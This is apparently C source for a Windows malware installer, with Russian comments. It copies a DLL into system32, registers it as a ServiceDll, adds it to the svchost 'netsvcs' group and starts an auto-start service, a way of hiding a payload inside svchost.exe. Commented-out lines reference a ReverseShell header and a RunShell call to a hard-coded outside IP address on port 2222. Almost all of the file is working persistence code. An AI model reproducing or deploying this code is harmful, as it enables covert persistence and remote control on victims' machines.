//#include "ReverseShell.h"
#include <Windows.h>
#include <stdio.h>

//возвращает полную текущую диру
LPSTR getFullCurrentDir()
{
	LPSTR path = (LPSTR)calloc(MAX_PATH, 1);
	HMODULE module = GetModuleHandle(NULL);
	GetModuleFileNameA(module, path, MAX_PATH);
	for (int i = lstrlenA(path); i > 1; i--)
		if (path[i] == '\\') {
			path[i] = '\0';
			break;
		}
	return path;
}

LPSTR getSystemDir()
{
	LPSTR path = (LPSTR)calloc(MAX_PATH, 1);
	GetSystemDirectoryA(path, MAX_PATH);
	return path;
}

//Copy fiel to system32
BOOL dropFile(LPSTR srcFullPath, LPSTR shortName)
{
	LPSTR fullPath = NULL;

	fullPath = getSystemDir();
	sprintf(fullPath, "%s\\%s", fullPath, shortName);

	DWORD status = CopyFileA(srcFullPath, fullPath, FALSE);
	
	free(fullPath);
	return status != 0;

}

LPCSTR memmem(LPCSTR haystack, size_t haystack_len, LPCSTR needle, const size_t needle_len)
{
	if (haystack == NULL) return NULL; // or assert(haystack != NULL);
	if (haystack_len == 0) return NULL;
	if (needle == NULL) return NULL; // or assert(needle != NULL);
	if (needle_len == 0) return NULL;

	for (const char *h = haystack;
		haystack_len >= needle_len;
		++h, --haystack_len) {
		if (!memcmp(h, needle, needle_len)) {
			return h;
		}
	}
	return NULL;
}

// groupName - в какую группу добавлять: netsvcs
// serviceName - какую службу добавлять
BOOL includeToSvcHostGroup(LPSTR groupName, LPSTR serviceName)
{
	BOOL result = FALSE, status = FALSE;
	HKEY hKey;

	if (RegOpenKeyA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost", &hKey) == ERROR_SUCCESS)
	{
		DWORD size, type;
		LPSTR netsvcsBuf = NULL;

		DWORD status = RegQueryValueExA(hKey, groupName, NULL, &type, NULL, &size);

		if (type == REG_MULTI_SZ && status == ERROR_SUCCESS)
		{
			DWORD netsvcsDataSize = size + strlen(serviceName) + 2;
			netsvcsBuf = (LPSTR)calloc(netsvcsDataSize, 1);
			status = RegQueryValueExA(hKey, groupName, NULL, NULL, (LPBYTE)netsvcsBuf, &size);

			// если уже добавлено, то выходим
			if (memmem(netsvcsBuf, netsvcsDataSize, serviceName, strlen(serviceName)) == 0)
			{
				LPSTR last = netsvcsBuf + size - 1;

				while (*(last - 1) == '\x00')
					last--;
				last++;

				strcat(last, serviceName);

				status = RegSetValueExA(hKey, groupName, 0, REG_MULTI_SZ, (LPBYTE)netsvcsBuf, netsvcsDataSize);
			}

			free(netsvcsBuf);
		}

	}
	RegCloseKey(hKey);
	return (status == ERROR_SUCCESS);
}

BOOL installService(LPCSTR serviceName, LPCSTR serviceFileName, LPCSTR serviceDescription)
{
	BOOL status = FALSE;
	HKEY hKey, hParKey;

	char regPath[MAX_PATH] = { 0 };
	char regValue[MAX_PATH] = { 0 };

	char serviceFullPath[MAX_PATH] = { 0 };
	char *systemDir = getSystemDir();

	sprintf(regPath, "SYSTEM\\CurrentControlSet\\Services\\%s", serviceName);
	sprintf(serviceFullPath, "%s\\%s", systemDir, serviceFileName);

	if (RegCreateKeyA(HKEY_LOCAL_MACHINE, regPath, &hKey) == ERROR_SUCCESS)
	{		
		RegSetValueExA(hKey, "Description", 0, REG_SZ, (BYTE*)serviceDescription, lstrlenA(serviceDescription));
				
		if (RegCreateKeyA(hKey, "Parameters", &hParKey) == ERROR_SUCCESS) 
		{
			status = RegSetValueExA(hParKey, "ServiceDll", 0, REG_EXPAND_SZ, (BYTE*)serviceFullPath, lstrlenA(serviceFullPath));
			RegCloseKey(hParKey);
		}
		RegCloseKey(hKey);
	}

	free(systemDir);

	return status == ERROR_SUCCESS;
}

void DbgPrint(char * str)
{
	CHAR data[10000] = { 0 };
	HWND wndMain = FindWindowA("Notepad", NULL);
	HWND edit = FindWindowExA(wndMain, 0, "Edit", NULL);

	SendMessageA(edit, WM_GETTEXT, 255, (LPARAM)data);
	strcat(data, "\n");
	strcat(data, str);
	SendMessageA(edit, WM_SETTEXT, 0, (LPARAM)data);
}

int main()
{	

//	RunShell("151.248.112.118", 2222);
//	system("pause");
//	return 0;

	BOOL install;

	LPSTR groupName = "netsvcs";
	LPSTR serviceName = "SvcHostDemo";
	LPSTR serviceDllName = "SvcHostDemo.dll";
	LPSTR serviceDescription = "SvcHostDemo description";	
	
	char serviceDllFullPath[MAX_PATH] = { 0 };

	char *currentDir = getFullCurrentDir();
	sprintf(serviceDllFullPath, "%s\\%s", currentDir, "MyService.dll");

	install = dropFile(serviceDllFullPath, serviceDllName);

	install = install & installService(serviceName, serviceDllName, serviceDescription);

	install = install & includeToSvcHostGroup(groupName, serviceName);

	if (install)
	{
		DbgPrint("[+] Installed\n");
		SC_HANDLE hService, hSCM;
		hSCM = OpenSCManager(0, 0, SC_MANAGER_CREATE_SERVICE);
		if (hSCM)
		{
			printf("[+] OpenSCManager\n");
			hService = CreateServiceA(
				hSCM, 
				serviceName,
				serviceName,
				SERVICE_ALL_ACCESS, SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
				"\%SystemRoot\%\\system32\\svchost.exe -k netsvcs", 0, 0, 0, 0, 0);

			if (hService)
			{
				printf("[+] CreateService\n");
				StartService(hService, 0, 0);
				CloseServiceHandle(hService);
				CloseServiceHandle(hSCM);
			}
			else
				printf("[-] CreateService %x\n", GetLastError());
		}
		else
			printf("[-] OpenSCManager\n");
	}
	else
		printf("[-] Installed\n");

	free(currentDir);
	//system("pause");
}

